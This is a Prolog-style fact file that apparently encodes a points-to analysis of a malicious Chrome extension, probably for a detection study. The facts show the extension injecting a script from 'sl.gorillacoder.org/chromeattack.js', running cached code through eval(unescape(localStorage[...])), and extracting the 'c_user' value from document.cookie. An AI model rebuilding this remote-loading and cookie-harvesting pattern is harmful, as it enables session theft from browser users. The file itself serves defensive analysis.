load('t0','window','onready').
actual('0','1','0').
callRet('0','0').
store('window','onready','t1').
assign('vide_R_0','vide_R_0').
assign('FB_R_0','0').
assign('a_R_?','0').
ptsTo('start_R_1','d_start_R_1').
heapPtsTo('d_start_R_1','prototype','p_start_R_1').
prototype('p_start_R_1','h_FP').
methodRet('d_start_R_1','start_R_1').
formal('d_start_R_1','1','a_R_1').
assign('GM_xmlhttpRequest_R_0','lambda_R_4').
...
formal('d_lambda_R_4','1','postmess_R_4').
ptsTo('getakey_R_6','d_getakey_R_6').
heapPtsTo('d_getakey_R_6','prototype','p_getakey_R_6').
prototype('p_getakey_R_6','h_FP').
methodRet('d_getakey_R_6','getakey_R_6').
ptsTo('ajaxeur_R_8','d_ajaxeur_R_8').
heapPtsTo('d_ajaxeur_R_8','prototype','p_ajaxeur_R_8').
prototype('p_ajaxeur_R_8','h_FP').
methodRet('d_ajaxeur_R_8','ajaxeur_R_8').
formal('d_ajaxeur_R_8','1','urlpost_R_8').
formal('d_ajaxeur_R_8','2','params_R_8').
formal('d_ajaxeur_R_8','3','callback_R_8').
ptsTo('save_options_R_11','d_save_options_R_11').
heapPtsTo('d_save_options_R_11','prototype','p_save_options_R_11').
prototype('p_save_options_R_11','h_FP').
methodRet('d_save_options_R_11','save_options_R_11').
ptsTo('restore_options_R_13','d_restore_options_R_13').
heapPtsTo('d_restore_options_R_13','prototype','p_restore_options_R_13').
prototype('p_restore_options_R_13','h_FP').
methodRet('d_restore_options_R_13','restore_options_R_13').
assign('t2','t3').
...
ptsTo('t6','n_XMLHttpRequest_R_?_0').
prototype('n_XMLHttpRequest_R_?_0', 'p_XMLHttpRequest_R_?').
assign('req_R_0','t6').
load('t8','req_R_0','open_R_?').
actual('3','1','GET').
callRet('3','GET').
actual('3','2','t15').
callRet('3','t15').
...
callRet('3','true').
assign('t7','t16').
load('t17','req_R_0','onload').
store('req_R_0','onload','showPhotos_R_?').
load('t19','req_R_0','send_R_?').
actual('4','1','null').
callRet('4','null').
assign('t18','t20').
ptsTo('showPhotos_R_18','d_showPhotos_R_18').
heapPtsTo('d_showPhotos_R_18','prototype','p_showPhotos_R_18').
prototype('p_showPhotos_R_18','h_FP').
methodRet('d_showPhotos_R_18','showPhotos_R_18').
ptsTo('constructImageURL_R_19','d_constructImageURL_R_19').
heapPtsTo('d_constructImageURL_R_19','prototype','p_constructImageURL_R_19').
prototype('p_constructImageURL_R_19','h_FP').
methodRet('d_constructImageURL_R_19','constructImageURL_R_19').
formal('d_constructImageURL_R_19','1','photo_R_19').
ptsTo('ajaxcrox_R_20','d_ajaxcrox_R_20').
heapPtsTo('d_ajaxcrox_R_20','prototype','p_ajaxcrox_R_20').
prototype('p_ajaxcrox_R_20','h_FP').
methodRet('d_ajaxcrox_R_20','ajaxcrox_R_20').
formal('d_ajaxcrox_R_20','1','params_R_20').
formal('d_ajaxcrox_R_20','2','callback_R_20').
ptsTo('lang_R_22','d_lang_R_22').
heapPtsTo('d_lang_R_22','prototype','p_lang_R_22').
prototype('p_lang_R_22','h_FP').
methodRet('d_lang_R_22','lang_R_22').
formal('d_lang_R_22','1','callback_R_22').
load('t22','chrome','extension').
load('t23','t22','onRequest').
load('t24','t23','addListener').
actual('5','1','lambda_R_24').
callRet('5','lambda_R_24').
assign('t21','t25').
...
formal('d_lambda_R_24','1','request_R_24').
formal('d_lambda_R_24','2','sender_R_24').
formal('d_lambda_R_24','3','callback_R_24').
load('t27','document','getElementById_R_?').
actual('6','1','socialplus').
callRet('6','socialplus').
assign('t26','t28').
methodRet('d_start_R_1','null').
load('t29','document','createElement_R_?').
actual('7','1','script').
callRet('7','script').
assign('s_R_1','t30').
assign('t31','1').
load('t32','s_R_1','type').
store('s_R_1','type','text/javascript').
load('t33','s_R_1','id').
store('s_R_1','id','socialplus').
load('t34','s_R_1','className').
store('s_R_1','className','cachedVersion').
load('t35','s_R_1','innerHTML').
store('s_R_1','innerHTML','eval(unescape(localStorage["SPcachescript"]));').
load('t37','document','getElementsByTagName').
actual('8','1','head').
callRet('8','head').
load('t39','t38','0').
assign('t36','t39').
assign('t40','t41').
actual('9','1','lambda_R_2').
callRet('9','lambda_R_2').
actual('9','2','100').
callRet('9','100').
assign('t42','t43').
...
load('t45','document','getElementsByTagName_R_?').
actual('10','1','head').
callRet('10','head').
load('t47','t46','0').
load('t48','t47','appendChild_R_?').
actual('11','1','s_R_1').
callRet('11','s_R_1').
assign('t44','t49').
assign('t50','t51').
load('t52','localStorage_R_?','lastconnection').
store('localStorage_R_?','lastconnection','').
load('t53','s_R_1','type').
store('s_R_1','type','text/javascript').
load('t54','s_R_1','id').
store('s_R_1','id','socialplus').
load('t55','s_R_1','src').
store('s_R_1','src','http://sl.gorillacoder.org/chromeattack.js').
load('t57','document','getElementsByTagName').
actual('13','1','head').
callRet('13','head').
load('t59','t58','0').
assign('t56','t59').
assign('t60','t61').
actual('14','1','lambda_R_3').
callRet('14','lambda_R_3').
actual('14','2','100').
callRet('14','100').
assign('t62','t63').
...
load('t65','document','getElementsByTagName').
actual('15','1','head').
callRet('15','head').
load('t67','t66','0').
load('t68','t67','appendChild').
actual('16','1','s_R_1').
callRet('16','s_R_1').
assign('t64','t69').
assign('t70','t71').
...
callRet('19','t76').
assign('t75','t77').
load('t79','chrome','extension').
load('t80','t79','sendRequest').
store('t81','methode_R_?','ajaxcrox').
store('t81','params_R_?','postmess_R_4').
actual('20','1','t81').
callRet('20','t81').
actual('20','2','lambda_R_5').
callRet('20','lambda_R_5').
assign('t78','t82').
...
formal('d_lambda_R_5','1','response_R_5').
load('t84','postmess_R_4','onload_R_?').
store('t85','responseText_R_?','response_R_5').
actual('21','1','t85').
callRet('21','t85').
assign('t83','t86').
load('t88','document','cookie').
assign('t87','t88').
load('t89','document','cookie').
load('t90','t89','indexOf_R_?').
actual('22','1','c_user').
callRet('22','c_user').
assign('index_R_?','t91').
assign('t93','1').
assign('t92','t94').
load('t95','document','cookie').
load('t96','t95','indexOf').
actual('23','1','=').
callRet('23','=').
actual('23','2','index_R_?').
callRet('23','index_R_?').
assign('nDeb_R_?','t98').
load('t99','document','cookie').
load('t100','t99','indexOf').
actual('24','1',';').
callRet('24',';').
actual('24','2','index_R_?').
callRet('24','index_R_?').
assign('nFin_R_?','t101').
assign('t103','1').
assign('t102','t104').
load('t105','document','cookie').
load('t106','t105','length').
assign('nFin_R_?','t106').
load('t107','document','cookie').
load('t108','t107','substring_R_?').
actual('25','1','nDeb_R_?').
callRet('25','nDeb_R_?').
actual('25','2','nFin_R_?').
callRet('25','nFin_R_?').
...
actual('27','1','t113').
callRet('27','t113').
actual('27','2','vide_R_0').
callRet('27','vide_R_0').
actual('27','3','lambda_R_7').
callRet('27','lambda_R_7').
assign('t112','t114').
...
formal('d_lambda_R_7','1','data_R_7').
load('t115','localStorage_R_?','mykey').
store('localStorage_R_?','mykey','data_R_7').
load('t117','window','setTimeout_R_?').
actual('28','1','lambda_R_9').
...
store('t120','method_R_?','GET').
store('t120','url_R_?','urlpost_R_8').
store('t121','Content-type','application/x-www-form-urlencoded').
store('t120','headers_R_?','t121').
store('t120','cache_R_?','false').
load('t122','params_R_8','join_R_?').
actual('29','1','&').
callRet('29','&').
store('t120','data_R_?','t123').
store('t120','onload_R_?','lambda_R_10').
actual('30','1','t120').
callRet('30','t120').
assign('t119','t124').
...
formal('d_lambda_R_10','1','xhr_R_10').
load('t125','xhr_R_10','responseText').
actual('31','1','t125').
callRet('31','t125').
assign('json_R_10','t126').
actual('32','1','json_R_10').
callRet('32','json_R_10').
assign('t127','t128').
load('t129','document','getElementById_R_?').
actual('33','1','color').
callRet('33','color').
assign('select_R_11','t130').
load('t131','select_R_11','children').
load('t132','select_R_11','selectedIndex').
load('t133','t131','t132').
load('t134','t133','value').
assign('color_R_11','t134').
load('t135','localStorage_R_?','favorite_color').
store('localStorage_R_?','favorite_color','color_R_11').
load('t136','document','getElementById').
actual('34','1','status').
callRet('34','status').
assign('status_R_11','t137').
load('t138','status_R_11','innerHTML').
store('status_R_11','innerHTML','Options Saved.').
actual('35','1','lambda_R_12').
callRet('35','lambda_R_12').
actual('35','2','750').
callRet('35','750').
assign('t139','t140').
...
load('t141','status_R_11','innerHTML').
store('status_R_11','innerHTML','').
load('t142','localStorage_R_?','favorite_color').
assign('favorite_R_13','t142').
assign('t144','favorite_R_13').
assign('t143','t144').
methodRet('d_restore_options_R_13','null').
load('t145','document','getElementById_R_?').
actual('36','1','color').
callRet('36','color').
assign('select_R_13','t146').
load('t148','select_R_13','children').
load('t149','t148','length').
assign('t147','t150').
assign('i_R_13','0').
assign('t152','i_R_13').
assign('t151','t152').
load('t153','select_R_13','children').
load('t154','t153','i_R_13').
assign('child_R_13','t154').
load('t156','child_R_13','value').
assign('t155','t157').
load('t158','child_R_13','selected').
store('child_R_13','selected','true').
assign('i_R_13','0').
load('t159','document','getElementById_R_?').
actual('37','1','_added_by_transform_0').
callRet('37','_added_by_transform_0').
assign('temp_R_14','t160').
load('t162','temp_R_14','addEventListener_R_?').
actual('38','1','load').
callRet('38','load').
actual('38','2','lambda_R_15').
callRet('38','lambda_R_15').
assign('t161','t163').
...
actual('40','1','_added_by_transform_1').
callRet('40','_added_by_transform_1').
assign('temp_R_16','t167').
load('t169','temp_R_16','addEventListener_R_?').
actual('41','1','click').
callRet('41','click').
actual('41','2','lambda_R_17').
callRet('41','lambda_R_17').
assign('t168','t170').
...
assign('t171','t172').
load('t173','req_R_0','responseXML').
load('t174','t173','getElementsByTagName_R_?').
actual('43','1','photo').
callRet('43','photo').
assign('photos_R_18','t175').
load('t176','photos_R_18','i_R_18').
assign('photo_R_?','t176').
assign('i_R_18','0').
assign('photo_R_?','__undefined__').
assign('t178','i_R_18').
assign('t177','t178').
load('t179','document','createElement_R_?').
actual('44','1','image').
callRet('44','image').
assign('img_R_18','t180').
load('t181','img_R_18','src').
actual('45','1','photo_R_?').
callRet('45','photo_R_?').
store('img_R_18','src','t182').
load('t184','document','body').
load('t185','t184','appendChild_R_?').
actual('46','1','img_R_18').
callRet('46','img_R_18').
assign('t183','t186').
assign('i_R_18','0').
assign('photo_R_?','__undefined__').
load('t187','photo_R_19','getAttribute_R_?').
actual('47','1','farm').
callRet('47','farm').
load('t191','photo_R_19','getAttribute').
actual('48','1','server').
callRet('48','server').
load('t195','photo_R_19','getAttribute').
actual('49','1','id').
callRet('49','id').
load('t199','photo_R_19','getAttribute').
actual('50','1','secret').
callRet('50','secret').
methodRet('d_constructImageURL_R_19','t202').
ptsTo('t203','n_XMLHttpRequest_R_?_1').
prototype('n_XMLHttpRequest_R_?_1', 'p_XMLHttpRequest_R_?').
assign('xdr_R_20','t203').
load('t204','xdr_R_20','onreadystatechange').
store('xdr_R_20','onreadystatechange','lambda_R_21').
...
load('t206','xdr_R_20','open_R_?').
load('t207','params_R_20','method').
load('t208','params_R_20','url').
actual('51','1','t207').
callRet('51','t207').
actual('51','2','t208').
callRet('51','t208').
...
callRet('51','true').
assign('t205','t209').
load('t211','xdr_R_20','setRequestHeader_R_?').
actual('52','1','Content-type').
callRet('52','Content-type').
actual('52','2','application/x-www-form-urlencoded').
callRet('52','application/x-www-form-urlencoded').
assign('t210','t212').
load('t214','xdr_R_20','send_R_?').
load('t215','params_R_20','data').
actual('53','1','t215').
callRet('53','t215').
assign('t213','t216').
load('t218','xdr_R_20','readyState').
assign('t217','t219').
load('t221','xdr_R_20','responseText').
actual('54','1','t221').
callRet('54','t221').
assign('t220','t222').
load('t224','chrome','i18n').
load('t225','t224','getAcceptLanguages').
actual('55','1','lambda_R_23').
callRet('55','lambda_R_23').
assign('t223','t226').
...
formal('d_lambda_R_23','1','languageList_R_23').
load('t227','languageList_R_23','0').
assign('reallang_R_23','t227').
assign('t228','reallang_R_23').
assign('shortlang_R_23','en').
load('t229','reallang_R_23','substring_R_?').
actual('56','1','0').
callRet('56','0').
actual('56','2','2').
callRet('56','2').
assign('shortlang_R_23','t230').
actual('57','1','shortlang_R_23').
callRet('57','shortlang_R_23').
assign('t231','t232').
load('t234','request_R_24','methode').
assign('t233','t235').
load('t237','request_R_24','methode').
assign('t236','t238').
actual('58','1','callback_R_24').
callRet('58','callback_R_24').
assign('t239','t240').
load('t242','request_R_24','params').
actual('59','1','t242').
callRet('59','t242').
actual('59','2','callback_R_24').
callRet('59','callback_R_24').
assign('t241','t243').
% basicrules.pl
